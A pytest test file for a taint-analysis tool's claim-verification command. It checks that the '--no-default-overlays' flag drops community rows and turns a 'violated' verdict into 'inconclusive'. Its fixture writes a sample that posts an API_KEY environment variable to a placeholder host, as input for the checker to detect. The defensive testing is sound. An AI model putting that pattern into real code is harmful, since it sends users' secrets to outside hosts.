# SPDX-License-Identifier: AGPL-3.0-or-later
"""``--no-default-overlays`` reaches the taint verdict (INV-fikoh), end to end.

THE FILED REPRO. ``os.environ["API_KEY"]`` is posted with ``requests.post``;
``requests`` is rowed only by the COMMUNITY overlay python-http-clients.yaml.
Claim: host_secret must not reach the network. Measured on dev d48540acc7:

    default                   violated  rc 1  (via requests.post), notice on stderr
    --no-default-overlays     violated  rc 1  (via requests.post), NO notice

The flag's help promises the community rows are omitted; the taint arm used
them anyway and said nothing. With the rows omitted, nothing in the catalogue
classifies the call, so the honest verdict is inconclusive, and the verdict
lists no community file.
"""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import main


@pytest.fixture
def repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    root = tmp_path / "repo"
    root.mkdir()
    (root / "main.py").write_text(
        "import os\nimport requests\n\n\ndef leak():\n"
        '    key = os.environ["API_KEY"]\n'
        '    requests.post("https://x.example", data=key)\n'
    )
    (tmp_path / "claims.yaml").write_text(
        "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
        "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
    )
    return root


def _verify(repo: Path, *flags: str) -> tuple[int, dict, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc = main([
            "verify-claims", str(repo), "--claims", str(repo.parent / "claims.yaml"),
            "--format", "json", *flags,
        ])
    return rc, json.loads(out.getvalue()), err.getvalue()


def test_by_default_the_community_row_finds_the_flow(repo: Path) -> None:
    """THE CONTROL: the row matches, so the flag has something to remove."""
    rc, doc, err = _verify(repo)
    (verdict,) = doc["verdicts"]
    assert (rc, verdict["verdict"]) == (1, "violated")
    assert any("requests.post" in e["sink_primitives"] for e in verdict["evidence"])
    assert "community I/O rows" in err


def test_the_flag_omits_the_community_row_from_the_taint_arm(repo: Path) -> None:
    rc, doc, err = _verify(repo, "--no-default-overlays")
    (verdict,) = doc["verdicts"]
    assert (rc, verdict["verdict"]) == (2, "inconclusive")
    assert not any(
        "requests.post" in e["sink_primitives"] for e in verdict.get("evidence", [])
    )
    assert doc["catalog_provenance"]["tiers"]["community"] == []
    assert "community I/O rows" not in err
